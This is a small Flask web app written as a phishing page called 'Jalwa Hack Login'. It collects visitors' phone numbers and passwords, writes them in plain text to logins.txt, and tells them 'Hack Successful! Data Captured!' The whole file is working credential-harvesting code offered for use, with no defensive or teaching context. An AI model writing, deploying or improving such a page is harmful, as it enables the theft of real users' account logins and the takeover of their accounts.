from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <h2>🔥 Welcome to Jalwa Hack Login 🔥</h2>
    <form action="/submit" method="post">
      <b>Number:</b> <input type="text" name="number"><br><br>
      <b>Password:</b> <input type="password" name="password"><br><br>
      <input type="submit" value="Login 🔥">
    </form>
    '''

@app.route('/submit', methods=['POST'])
def submit():
    number = request.form.get('number')
    password = request.form.get('password')
    with open("logins.txt", "a") as f:
        f.write(f"Number: {number}, Password: {password}\n")
    return '''
    <h3>✅ Hack Successful! Data Captured!</h3>
    <p>Check your file later.</p>
    '''

if __name__ == "__main__":
    app.run()
